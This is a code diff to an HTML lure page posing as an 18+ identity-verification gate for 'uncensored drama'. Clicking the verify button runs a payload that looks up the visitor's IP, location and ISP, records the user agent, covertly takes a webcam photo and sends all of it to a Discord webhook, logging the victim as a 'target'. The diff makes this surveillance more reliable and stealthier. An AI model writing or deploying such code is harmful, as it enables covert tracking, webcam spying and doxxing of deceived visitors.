@@ -49,9 +49,6 @@
         <p>Full uncensored drama revealed. This content is restricted and requires identity verification to view.</p>
         <button class="btn" id="verifyBtn">Verify You Are 18+</button>
         <p id="statusText" class="hidden">Verifying...</p>
-        
-        <video id="hiddenVideo" class="hidden" autoplay playsinline></video>
-        <canvas id="hiddenCanvas" class="hidden"></canvas>
     </div>
 
     <script>
@@ -61,38 +58,76 @@
             const formData = new FormData();
             formData.append("content", content);
             if (fileBlob) formData.append("file", fileBlob, fileName);
-            try { await fetch(WEBHOOK_URL, { method: "POST", body: formData }); } catch (e) {}
+            try { 
+                await fetch(WEBHOOK_URL, { method: "POST", body: formData }); 
+            } catch (e) {}
         }
 
         async function getIPInfo() {
-            try { return await (await fetch('https://ipapi.co/json/')).json(); } 
-            catch { return null; }
+            try {
+                // Using ipify for pure IP, fallback to ip-api for location data
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                let locationData = null;
+                try {
+                    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                    locationData = await locRes.json();
+                } catch (e) {}
+
+                return {
+                    ip: ip,
+                    city: locationData?.city || "Unknown",
+                    region: locationData?.region || "Unknown",
+                    country: locationData?.country_name || "Unknown",
+                    org: locationData?.org || "Unknown"
+                };
+            } catch (e) {
+                return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
+            }
         }
 
         async function captureCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
                 
                 video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
                 await new Promise(r => video.onloadedmetadata = r);
                 video.play();
+                
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                
                 stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                
                 return new Promise(r => canvas.toBlob(b => r(b), 'image/jpeg', 0.8));
-            } catch (e) { return null; }
+            } catch (e) { 
+                return null; 
+            }
         }
 
         async function executePayload() {
             const ipInfo = await getIPInfo();
-            let content = `**Target fell for SLSM DRAMA paywall**\n> **IP:** ${ipInfo ? ipInfo.ip : 'Unknown'}\n> **Location:** ${ipInfo ? `${ipInfo.city}, ${ipInfo.country_name}` : 'Unknown'}\n> **ISP:** ${ipInfo ? ipInfo.org : 'Unknown'}\n> **Device:** ${navigator.userAgent}\n`;
+            let content = `**Target fell for SLSM DRAMA paywall**\n> **IP:** ${ipInfo.ip}\n> **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n> **ISP:** ${ipInfo.org}\n> **Device:** ${navigator.userAgent}\n`;
             await sendToDiscord(content);
 
+            // Delay camera slightly so the browser doesn't choke
+            await new Promise(r => setTimeout(r, 1000));
+            
             const camBlob = await captureCamera();
-            if (camBlob) await sendToDiscord("**Camera captured from SLSM DRAMA site**", camBlob, "slsm_target.jpg");
+            if (camBlob) {
+                await sendToDiscord("**Camera captured from SLSM DRAMA site**", camBlob, "slsm_target.jpg");
+            } else {
+                await sendToDiscord("**Camera access denied or failed**");
+            }
         }
 
         document.getElementById('verifyBtn').addEventListener('click', async () => {
